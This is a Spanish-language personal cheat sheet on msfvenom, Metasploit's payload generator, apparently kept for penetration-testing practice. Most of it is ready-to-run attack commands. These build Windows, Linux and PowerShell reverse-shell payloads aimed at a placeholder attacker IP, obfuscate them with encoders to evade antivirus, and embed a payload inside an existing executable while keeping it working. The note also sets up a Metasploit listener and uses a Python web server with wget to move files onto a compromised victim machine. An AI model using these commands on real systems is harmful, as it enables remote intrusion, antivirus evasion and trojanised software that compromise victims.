Herramienta de Metasploit para:

- Generar payloads
    
- Generar archivos ejecutables
    
- Encoders (ofuscación)
    
- Ajustar opciones como LHOST, LPORT, formato, plantillas
    

Fusiona lo que antes era:

- `msfpayload`
    
- `msfencode`

https://youtu.be/UjjIEduADcA?si=xN7LhyqdgCNkfaD9

https://youtu.be/XLWyjN_eBhw?si=SJn3HtWzRE5myrJb

---

## Uso general (estructura mental)

`msfvenom -p <payload> <opciones> -f <formato> > <archivo>`

---

## Opciones clave

|Opción|Descripción|
|---|---|
|`-p`|Payload (ej: `windows/meterpreter/reverse_tcp`)|
|`LHOST`|IP del atacante (listener)|
|`LPORT`|Puerto del listener|
|`-f`|Formato de salida (exe, elf, raw, c, python, asp, etc)|
|`-a`|Arquitectura (x86, x64)|
|`--platform`|Plataforma (Windows, Linux, etc)|
|`-e`|Encoder (ej: `x86/shikata_ga_nai`)|
|`-i`|Iteraciones del encoder|
|`-x`|Usar un ejecutable plantilla (infección en binario)|
|`-k`|Mantener funcionalidad del ejecutable plantilla|
|`--list`|Listar cosas (`payloads`, `encoders`, `formats`, `all`)|

---

## Listar elementos

`msfvenom --list payloads msfvenom --list encoders msfvenom --list formats`

---

## Payloads comunes

**Reverse shells**

- `windows/meterpreter/reverse_tcp`
    
- `linux/x86/meterpreter/reverse_tcp`
    
- `cmd/unix/reverse_bash`
    

**Bind shells**

- `windows/shell/bind_tcp`
    
- `linux/x86/shell/bind_tcp`
    

---

## Formatos útiles

- `exe` (Windows)
    
- `elf` (Linux)
    
- `apk` (Android)
    
- `c`, `raw`, `py` (incrustar payload)
    
- `ps1` (PowerShell)
    
- `macho` (macOS)
    

---

## Ejemplos prácticos

### **1. Payload Windows ejecutable**

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<tu_ip> LPORT=4444 -f exe > payload.exe`

### **2. Payload Linux ELF**

`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<tu_ip> LPORT=4444 -f elf > payload.elf`

### **3. Payload raw para inyectar en exploit**

`msfvenom -p windows/shell_reverse_tcp LHOST=<tu_ip> LPORT=4444 -f raw > shell.raw`

### **4. Payload en C (para compilar manualmente)**

`msfvenom -p linux/x86/shell_reverse_tcp LHOST=<tu_ip> LPORT=4444 -f c > shell.c`

### **5. Payload Powershell**

`msfvenom -p windows/meterpreter/reverse_https LHOST=<tu_ip> LPORT=443 -f ps1 > payload.ps1`

---

## Uso de encoders (ofuscación)

### **Básico**

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > encoded.exe`

- `-e` define encoder
    
- `-i` número de iteraciones
    

**Nota táctica:** Ofusca para evadir AV básico, pero no hace milagros.

---

## Infección de ejecutables

Permite meter un payload dentro de un ejecutable existente.

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -x app.exe -k -f exe > app_infectado.exe`

- `-x` define binario plantilla
    
- `-k` mantiene funcionalidad original
    

---

## Elección de payloads según escenario

|Escenario|Recomendación|
|---|---|
|NAT, firewalls|`reverse_https`|
|Red local|`reverse_tcp`|
|Sandbox|Inlines sin staging (`*_reverse_tcp`)|
|Antivirus básico|Encoders + plantillas|

---

## Integración con Metasploit (listener)

Después de generar un payload, en `msfconsole`:

`use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST <tu_ip> set LPORT 4444 run`

# creacion de servidor en python

podemos crear un servidor en python para pasar de forma mas sencilla archivos de una maquina a otra y provar payloads 
para eso usamos el siguiente comando en la maquina atacante 

python3 -m http.server 80

despues de eso accedemos al link desde la maquina victima que resulto del comando anterior

algo que me gusta hacer es que despues del ataque cuando ya tengo acceso a la maquina victima , creo un servidor http en python desde mi maquina atacante y desde la maquina victima pongo esto
wget  <link_del_servido_http>  /  < nombre_del_archivo_que_queremos_descargar>   -o  (-o sirve para cambiar el nombre ) <nuevo_nombre>

